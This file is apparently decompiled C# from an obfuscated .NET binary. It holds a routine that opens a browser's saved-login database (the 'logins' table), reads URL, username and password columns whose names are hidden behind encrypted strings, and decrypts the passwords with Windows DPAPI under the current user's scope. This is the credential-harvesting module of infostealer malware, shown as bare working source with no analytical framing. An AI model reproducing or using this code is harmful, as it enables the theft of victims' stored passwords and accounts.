using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

internal sealed class SRT
{
	internal static List<JK> VQ(string KWS_230, string RF_231, string OCE_232 = "logins")
	{
		//Discarded unreachable code: IL_010a, IL_011d
		//IL_0114: Expected O, but got I4
		//IL_0115: Expected O, but got I4
		List<JK> list = new List<JK>();
		if (!File.Exists(KWS_230))
		{
			return list;
		}
		AZI aZI;
		try
		{
			aZI = new AZI(KWS_230);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = list;
			ProjectData.ClearProjectError();
			return result;
		}
		if (!aZI.JIG(OCE_232))
		{
			return list;
		}
		string empty = string.Empty;
		string empty2 = string.Empty;
		string empty3 = string.Empty;
		checked
		{
			int num = aZI.KW() - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					empty = aZI.UTA(i, O.I("unjAb9CR9QJa+RjgchV5bQ=="));
					empty2 = aZI.UTA(i, O.I("8uKtjImLSsDlnrbG92hXAg=="));
					empty3 = JNX(aZI.UTA(i, O.I("Kd+xPepKm/k0il1s95voqw==")));
					if (!string.IsNullOrEmpty(empty) && !string.IsNullOrEmpty(empty2) && empty3 != null)
					{
						JK jK = new JK();
						jK.WE_114 = empty;
						jK.ECS_112 = empty2;
						jK.GA_113 = empty3;
						jK.NP_115 = RF_231;
						list.Add(jK);
					}
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.ClearProjectError();
				}
			}
			return list;
		}
	}

	private static string JNX(string LZO_233)
	{
		//Discarded unreachable code: IL_003d, IL_0050
		//IL_0047: Expected O, but got I4
		if (LZO_233 == null || LZO_233.Length == 0)
		{
			return null;
		}
		try
		{
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(LZO_233), null, DataProtectionScope.CurrentUser));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
